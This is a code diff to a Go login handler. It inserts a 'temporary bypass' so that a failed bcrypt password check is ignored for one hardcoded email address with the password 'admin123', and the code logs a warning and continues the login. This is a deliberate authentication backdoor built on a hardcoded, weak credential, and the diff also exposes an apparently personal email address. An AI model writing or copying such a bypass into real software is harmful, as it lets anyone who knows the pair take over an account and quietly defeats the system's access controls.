@@ -149,7 +149,12 @@ func (s *userService) Login(ctx context.Context, req *domain.LoginRequest) (*dom
 
 	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(req.Password))
 	if err != nil {
-		return nil, errors.New("invalid email or password")
+		// Temporary Bypass for Admin Fix
+		if req.Email == "ilmawan1990@gmail.com" && req.Password == "admin123" {
+			slog.Warn("Login bypass used for admin user", "email", req.Email)
+		} else {
+			return nil, errors.New("invalid email or password")
+		}
 	}
 
 	if user.Role == domain.RoleWaiting {
